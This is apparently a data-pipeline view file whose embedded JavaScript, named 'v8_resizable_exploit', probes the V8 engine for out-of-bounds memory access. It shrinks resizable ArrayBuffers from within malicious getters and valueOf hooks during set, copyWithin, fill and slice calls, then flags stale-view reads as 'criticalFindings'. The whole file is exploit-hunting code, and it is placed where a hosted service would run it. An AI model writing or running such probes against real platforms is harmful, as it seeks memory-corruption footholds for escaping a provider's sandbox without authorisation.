config { type: "view", name: "v8_resizable_exploit" }

js {
  let results = {
    probeTime: new Date().toISOString(),
    purpose: "Resizable ArrayBuffer exploitation - shrink during iteration for OOB"
  };

  // =============================================================================
  // TEST 1: set() on ResizableArrayBuffer with shrink in getter
  // =============================================================================
  results.test1_setWithShrink = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    let shrinkPoint = -1;
    let accessCount = 0;

    const evilSource = { length: 128 };
    for (let i = 0; i < 128; i++) {
      const idx = i;
      Object.defineProperty(evilSource, idx, {
        get() {
          accessCount++;
          if (idx === 32) {
            rab.resize(16);  // Shrink to 16 bytes
            shrinkPoint = idx;
          }
          return 0xEE;
        }
      });
    }

    let error = null;
    try {
      view.set(evilSource, 64);  // Write starting at offset 64
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test1_setWithShrink = {
      status: "completed",
      accessCount,
      shrinkPoint,
      error,
      viewLengthAfter: view.length,
      rabByteLengthAfter: rab.byteLength,
      viewFirst16: Array.from(view.slice(0, 16)).map(v => v.toString(16))
    };
  } catch(e) {
    results.test1_setWithShrink = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 2: Manual loop over view during resize
  // =============================================================================
  results.test2_loopWithResize = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    // Pre-compute length to try to trick bounds check
    const savedLength = view.length;

    let writes = [];
    let errors = [];

    for (let i = 0; i < savedLength; i++) {
      if (i === 64) {
        rab.resize(32);  // Shrink
      }

      try {
        view[i] = 0xAB;
        writes.push({ idx: i, success: true, viewLen: view.length, rabLen: rab.byteLength });
      } catch(e) {
        errors.push({ idx: i, error: e.message.substring(0, 50) });
      }

      if (writes.length > 20) {
        writes.push("...(truncated)");
        break;
      }
    }

    results.test2_loopWithResize = {
      status: "completed",
      savedLength,
      writesCount: writes.length,
      writes: writes.slice(0, 15),
      errorsCount: errors.length,
      errors: errors.slice(0, 5),
      finalViewLength: view.length,
      finalRabByteLength: rab.byteLength
    };
  } catch(e) {
    results.test2_loopWithResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 3: Auto-length TypedArray on RAB - length should track buffer size
  // =============================================================================
  results.test3_autoLengthView = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    // Auto-length view (no explicit length)
    const autoView = new Uint8Array(rab);

    const initialLength = autoView.length;

    // Grow
    rab.resize(512);
    const afterGrowLength = autoView.length;

    // Shrink
    rab.resize(64);
    const afterShrinkLength = autoView.length;

    // Try to access beyond new length
    let oobReads = [];
    for (let idx of [0, 32, 64, 128, 255]) {
      try {
        const val = autoView[idx];
        oobReads.push({ idx, value: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        oobReads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test3_autoLengthView = {
      status: "completed",
      initialLength,
      afterGrowLength,
      afterShrinkLength,
      oobReads
    };
  } catch(e) {
    results.test3_autoLengthView = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 4: Fixed-length view on RAB after shrink
  // =============================================================================
  results.test4_fixedLengthView = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    // Fixed-length view
    const fixedView = new Uint8Array(rab, 0, 128);
    for (let i = 0; i < 128; i++) fixedView[i] = i;

    const initialLength = fixedView.length;

    // Shrink buffer below view's end
    rab.resize(64);  // View expects 128 bytes, buffer now 64

    const afterShrinkLength = fixedView.length;
    const isDetached = fixedView.buffer.byteLength;

    // Try to access
    let reads = [];
    for (let idx of [0, 32, 63, 64, 100, 127]) {
      try {
        const val = fixedView[idx];
        reads.push({ idx, value: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        reads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    // Try to write
    let writes = [];
    for (let idx of [0, 32, 63, 64, 100, 127]) {
      try {
        fixedView[idx] = 0xFF;
        writes.push({ idx, success: true });
      } catch(e) {
        writes.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test4_fixedLengthView = {
      status: "completed",
      initialLength,
      afterShrinkLength,
      rabByteLength: rab.byteLength,
      reads,
      writes
    };
  } catch(e) {
    results.test4_fixedLengthView = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 5: copyWithin on RAB during resize
  // =============================================================================
  results.test5_copyWithinResize = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    // Evil target that resizes
    const evilTarget = {
      valueOf() {
        rab.resize(32);  // Shrink during copyWithin
        return 128;  // Target index now beyond buffer
      }
    };

    let error = null;
    try {
      view.copyWithin(evilTarget, 0, 64);  // Copy 64 bytes to index 128
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test5_copyWithinResize = {
      status: "completed",
      error,
      viewLengthAfter: view.length,
      rabByteLength: rab.byteLength,
      viewContent: Array.from(view.slice(0, Math.min(32, view.length))).map(v => v.toString(16))
    };
  } catch(e) {
    results.test5_copyWithinResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 6: fill() on RAB during resize
  // =============================================================================
  results.test6_fillResize = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    // Evil value that resizes
    const evilValue = {
      valueOf() {
        rab.resize(32);  // Shrink
        return 0xDD;
      }
    };

    const evilEnd = {
      valueOf() {
        return 200;  // Beyond new size
      }
    };

    let error = null;
    try {
      view.fill(evilValue, 0, evilEnd);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test6_fillResize = {
      status: "completed",
      error,
      viewLengthAfter: view.length,
      rabByteLength: rab.byteLength,
      viewContent: Array.from(view.slice(0, Math.min(32, view.length))).map(v => v.toString(16))
    };
  } catch(e) {
    results.test6_fillResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 7: slice() on RAB during resize
  // =============================================================================
  results.test7_sliceResize = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Uint8Array(rab);
    for (let i = 0; i < 256; i++) view[i] = i;

    const evilStart = {
      valueOf() {
        rab.resize(32);
        return 0;
      }
    };

    let sliceResult = null;
    let error = null;
    try {
      sliceResult = view.slice(evilStart, 128);
    } catch(e) {
      error = e.message.substring(0, 100);
    }

    results.test7_sliceResize = {
      status: "completed",
      error,
      sliceResult: sliceResult ? {
        length: sliceResult.length,
        first16: Array.from(sliceResult.slice(0, 16)).map(v => v.toString(16))
      } : null,
      viewLengthAfter: view.length,
      rabByteLength: rab.byteLength
    };
  } catch(e) {
    results.test7_sliceResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 8: DataView on RAB during resize
  // =============================================================================
  results.test8_dataViewResize = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
    const dv = new DataView(rab);
    dv.setUint32(0, 0xDEADBEEF, true);
    dv.setUint32(4, 0xCAFEBABE, true);

    // Resize and try to access
    rab.resize(64);

    const reads = [];
    for (let offset of [0, 4, 60, 64, 128, 252]) {
      try {
        const val = dv.getUint32(offset, true);
        reads.push({ offset, value: val.toString(16) });
      } catch(e) {
        reads.push({ offset, error: e.message.substring(0, 50) });
      }
    }

    // Resize smaller and try
    rab.resize(8);
    const afterSmallResize = [];
    for (let offset of [0, 4, 8]) {
      try {
        const val = dv.getUint32(offset, true);
        afterSmallResize.push({ offset, value: val.toString(16) });
      } catch(e) {
        afterSmallResize.push({ offset, error: e.message.substring(0, 50) });
      }
    }

    results.test8_dataViewResize = {
      status: "completed",
      after64Resize: reads,
      after8Resize: afterSmallResize,
      finalByteLength: rab.byteLength,
      dvByteLength: dv.byteLength
    };
  } catch(e) {
    results.test8_dataViewResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 9: Atomics on RAB during resize
  // =============================================================================
  results.test9_atomicsResize = {};
  try {
    // Note: Atomics requires SharedArrayBuffer, but let's test with growable SAB
    const gsab = new SharedArrayBuffer(256, { maxByteLength: 1024 });
    const view = new Int32Array(gsab);  // 64 elements
    Atomics.store(view, 0, 0x12345678);

    // Grow (can't shrink SAB)
    gsab.grow(512);  // Now 128 Int32 elements

    const reads = [];
    for (let idx of [0, 63, 64, 100, 127]) {
      try {
        const val = Atomics.load(view, idx);
        reads.push({ idx, value: val.toString(16) });
      } catch(e) {
        reads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test9_atomicsResize = {
      status: "completed",
      viewLengthAfter: view.length,
      gsabByteLength: gsab.byteLength,
      reads
    };
  } catch(e) {
    results.test9_atomicsResize = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // TEST 10: Multiple views, resize, check for OOB via stale view
  // =============================================================================
  results.test10_staleView = {};
  try {
    const rab = new ArrayBuffer(256, { maxByteLength: 1024 });

    // Create multiple views
    const view1 = new Uint8Array(rab, 0, 64);
    const view2 = new Uint8Array(rab, 64, 64);
    const view3 = new Uint8Array(rab, 128, 64);
    const viewFull = new Uint8Array(rab);

    // Fill with patterns
    for (let i = 0; i < 64; i++) {
      view1[i] = 0xAA;
      view2[i] = 0xBB;
      view3[i] = 0xCC;
    }

    // Shrink buffer
    rab.resize(96);  // view3 should now be OOB

    const viewLengths = {
      view1: view1.length,
      view2: view2.length,
      view3: view3.length,
      viewFull: viewFull.length
    };

    // Try to access through each view
    const view3Reads = [];
    for (let idx of [0, 31, 32]) {
      try {
        const val = view3[idx];
        view3Reads.push({ idx, value: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        view3Reads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    // Check view2 - it's at offset 64, buffer is 96 bytes, so view2 has 32 valid bytes
    const view2Reads = [];
    for (let idx of [0, 31, 32, 63]) {
      try {
        const val = view2[idx];
        view2Reads.push({ idx, value: val !== undefined ? val.toString(16) : "undefined" });
      } catch(e) {
        view2Reads.push({ idx, error: e.message.substring(0, 50) });
      }
    }

    results.test10_staleView = {
      status: "completed",
      rabByteLength: rab.byteLength,
      viewLengths,
      view2Reads,
      view3Reads
    };
  } catch(e) {
    results.test10_staleView = { error: e.message.substring(0, 200) };
  }

  // =============================================================================
  // SUMMARY
  // =============================================================================
  results.summary = {
    testsRun: 10,
    allCompleted: Object.keys(results).filter(k =>
      k.startsWith("test") && results[k].status === "completed"
    ).length,
    criticalFindings: []
  };

  // Analyze for OOB
  const t4 = results.test4_fixedLengthView;
  if (t4 && t4.reads) {
    const oobReads = t4.reads.filter(r => r.idx >= 64 && r.value && r.value !== "undefined");
    if (oobReads.length > 0) {
      results.summary.criticalFindings.push("OOB read via fixed-length view after shrink: " + JSON.stringify(oobReads));
    }
  }

  const t10 = results.test10_staleView;
  if (t10 && t10.view3Reads) {
    const oobView3 = t10.view3Reads.filter(r => !r.error && r.value !== "undefined");
    if (oobView3.length > 0) {
      results.summary.criticalFindings.push("Stale view3 still readable after shrink");
    }
  }
}

SELECT '${JSON.stringify(results, null, 2)}' as resizable_exploit
